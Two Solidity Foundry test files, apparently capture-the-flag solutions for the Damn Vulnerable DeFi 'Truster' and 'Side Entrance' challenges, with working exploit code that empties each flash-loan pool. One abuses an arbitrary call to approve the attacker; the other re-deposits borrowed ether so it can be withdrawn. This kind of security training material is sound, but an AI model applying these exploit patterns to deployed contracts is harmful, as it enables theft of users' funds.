// SPDX-License-Identifier: MIT
// Demo proof of concept for crow.direct/demo.
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterApproveTest is Test {
    function test_anyoneTakesThePool() public {
        DamnValuableToken token = new DamnValuableToken();
        TrusterLenderPool pool = new TrusterLenderPool(token);
        token.transfer(address(pool), 1_000_000e18);
        address attacker = makeAddr("attacker");

        vm.startPrank(attacker);
        pool.flashLoan(0, attacker, address(token), abi.encodeCall(token.approve, (attacker, 1_000_000e18)));
        token.transferFrom(address(pool), attacker, 1_000_000e18);
        vm.stopPrank();

        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), 1_000_000e18);
    }
}

// SPDX-License-Identifier: MIT
// Demo proof of concept for crow.direct/demo.
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Borrower {
    SideEntranceLenderPool private immutable pool;

    constructor(SideEntranceLenderPool p) {
        pool = p;
    }

    function run() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

contract SideEntranceDepositTest is Test {
    function test_anyoneTakesThePool() public {
        SideEntranceLenderPool pool = new SideEntranceLenderPool();
        vm.deal(address(this), 1000 ether);
        pool.deposit{value: 1000 ether}();

        Borrower borrower = new Borrower(pool);
        borrower.run();

        assertEq(address(pool).balance, 0);
        assertEq(address(borrower).balance, 1000 ether);
    }
}
